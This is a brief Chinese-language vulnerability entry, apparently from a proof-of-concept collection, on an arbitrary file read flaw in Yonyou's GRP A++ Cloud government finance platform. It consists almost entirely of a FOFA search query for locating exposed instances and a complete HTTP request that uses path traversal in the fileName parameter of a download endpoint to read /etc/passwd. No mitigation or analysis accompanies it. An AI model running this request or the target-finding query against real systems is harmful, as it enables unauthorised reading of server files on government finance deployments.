## 用友GRPA++Cloud政府财务云存在任意文件读取漏洞

## fofa
```
body="/pf/portal/login/css/fonts/style.css"
```


## poc
```
GET /ma/emp/maEmp/download?fileName=../../../etc/passwd HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```
